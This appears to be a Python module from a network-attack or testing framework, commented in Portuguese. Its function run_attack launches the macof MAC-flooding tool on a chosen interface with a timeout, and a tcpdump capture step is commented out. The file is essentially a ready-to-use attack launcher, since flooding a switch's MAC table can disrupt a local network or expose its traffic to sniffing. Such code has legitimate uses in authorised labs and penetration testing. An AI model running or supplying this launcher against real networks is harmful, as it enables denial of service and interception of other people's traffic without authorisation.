import subprocess  
import logging  
import time  
# Configuração do logger para registro das mensagens do sistema
logger = logging.getLogger(__name__)

def run_attack(params):
    """
    Executa um ataque com a ferramenta Macof enquanto monitora o tráfego da interface
    especificada usando tcpdump.
    """
    # Extração dos parâmetros necessários para o ataque
    interface = params.get('interface')  # Interface de rede alvo
    timeout = params.get('timeout', 30)  # Tempo limite do ataque em segundos 

    # Verificamos se o parâmetro obrigatório 'interface' foi fornecido 
    if not interface:
        raise ValueError("Parâmetro 'interface' ausente")  # Erro se a interface não for especificada

    try:
        # Comando para capturar o tráfego da interface utilizando tcpdump
        #tcpdump_command = ['tcpdump', '-i', interface, '-w', f'tcpdump_{interface}.pcap']
        # -i <interface>: Especifica a interface de rede a ser monitorada
        # -w <arquivo>: Especifica o arquivo onde o tráfego capturado será salvo

        #tcpdump_process = subprocess.Popen(tcpdump_command)  # Inicia o processo tcpdump
        #logger.info(f"Monitorando o tráfego da interface {interface} com tcpdump")

        # Comando para executar o ataque com Macof
        attack_command = ['macof', '-i', interface]
        # -i <interface>: Especifica a interface de rede para enviar os pacotes
        logger.info(f"Executando Macof na interface {interface} com timeout de {timeout} segundos")

        # Executa o comando Macof e captura a saída
        result = subprocess.run(attack_command, capture_output=True, text=True, timeout=timeout)

        # Verifica o resultado da execução do comando
        if result.returncode == 0:
            status = "Sucesso"  
            output = result.stdout  # Saída padrão do comando
        else:
            status = "Falha"  
            output = result.stderr  # Saída de erro do comando
        
        logger.debug(f"Resultado do Macof: {output}")  # Registra o resultado detalhado
        return f"MacofAttack executado na interface {interface} - Status: {status}\nOutput:\n{output}"

    except subprocess.TimeoutExpired as e:
        # Tratamento para quando o comando excede o tempo limite
        logger.warning(f"Timeout de {timeout} segundos atingido para macof na interface {interface}")
        partial_output = e.output or "Nenhuma saída capturada antes do timeout."  # Saída antes do timeout
        return f"MacofAttack executado na interface {interface} - Status: Timeout ({timeout}s reached)\nPartial Output:\n{partial_output}"

    except subprocess.CalledProcessError as e:
        # Tratamento para erros de execução do comando
        logger.error(f"Erro ao executar Macof: {e}", exc_info=True)
        return f"Erro ao executar MacofAttack na interface {interface}: {e}"

    except Exception as e:
        # Tratamento para os erros genéricos
        logger.error(f"Erro desconhecido ao executar Macof: {e}", exc_info=True)
        return f"Erro desconhecido ao executar MacofAttack na interface {interface}: {e}"

    finally:
        # Finalizamos o processo tcpdump após o término do ataque
        #tcpdump_process.terminate()  # Encerramos o monitoramento de tráfego
        logger.info("Macof attack finalizado")
